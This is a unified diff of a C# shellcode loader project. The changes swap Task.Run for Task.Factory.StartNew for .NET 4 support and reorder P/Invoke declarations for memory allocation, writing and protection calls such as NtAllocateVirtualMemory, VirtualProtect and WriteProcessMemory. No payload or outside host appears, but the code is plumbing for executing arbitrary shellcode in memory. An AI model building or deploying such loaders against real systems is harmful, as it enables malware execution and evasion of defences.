@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Runtime.InteropServices;
+using System.Threading;
 using System.Threading.Tasks;
 using Microsoft.Win32.SafeHandles;
 /*
@@ -9,6 +10,7 @@ using Microsoft.Win32.SafeHandles;
  */
 namespace ShellCodeLoader
 {
+
     public class ShellCodeLoader : IDisposable
     {
         private byte[] ShellCode;
@@ -34,10 +36,12 @@ namespace ShellCodeLoader
         {
             if (this.Asynchronous)
             {
-                Task.Run(() =>
+                Task.Factory.StartNew(() => { NT(); }, CancellationToken.None, TaskCreationOptions.None, TaskScheduler.Default);
+                //Replace Task.Run with Task.Factory.StartNew for .net 4
+                /*Task.Run(() =>
                 {
                     NT();
-                });
+                });*/
             }
             else 
             {
@@ -49,10 +53,7 @@ namespace ShellCodeLoader
         {
             if (this.Asynchronous)
             {
-                Task.Run(() =>
-                {
-                    Kernel32();
-                });
+                Task.Factory.StartNew(() => { Kernel32(); }, CancellationToken.None, TaskCreationOptions.None, TaskScheduler.Default);
             }
             else 
             {
@@ -64,10 +65,8 @@ namespace ShellCodeLoader
         {
             if (this.Asynchronous)
             {
-                Task.Run(() =>
-                {
-                    NTDelegates();
-                });
+                Task.Factory.StartNew(() => { NTDelegates(); }, CancellationToken.None, TaskCreationOptions.None, TaskScheduler.Default);
+
             }
             else 
             {
@@ -79,7 +78,7 @@ namespace ShellCodeLoader
         {
             if (this.Asynchronous)
             {
-                Kernel32Delegates();
+                Task.Factory.StartNew(() => { Kernel32Delegates(); }, CancellationToken.None, TaskCreationOptions.None, TaskScheduler.Default);
             }
             else
             {
@@ -167,26 +166,36 @@ namespace ShellCodeLoader
 
             [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
             public static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref uint RegionSize, TypeAlloc AllocationType, PageProtection Protect);
+           
             [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
             public static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] buffer, UIntPtr bufferSize, out UIntPtr written);
+           
             [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
             public static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint numberOfBytes, PageProtection newProtect, ref PageProtection oldProtect);
+           
             [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
             public static extern uint NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, FreeType FreeType);
           
-            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
-            public static extern IntPtr GetCurrentProcess();
+
+          
             [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
             public static extern IntPtr VirtualAlloc(IntPtr address, IntPtr numBytes, TypeAlloc commitOrReserve, PageProtection pageProtectionMode);
+         
             [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
             public static extern IntPtr VirtualFree(IntPtr lpAddress, uint dwSize, FreeType FreeType);
+          
             [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
             public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, PageProtection flNewProtect, out PageProtection lpflOldProtect);
+          
             [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
             public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out UIntPtr lpNumberOfBytesWritten);
 
+            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
+            public static extern IntPtr GetCurrentProcess();
+
             [DllImport(KERNEL32)]
             public static extern IntPtr GetModuleHandle(string lpModuleName);
+
             [DllImport(KERNEL32)]
             public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
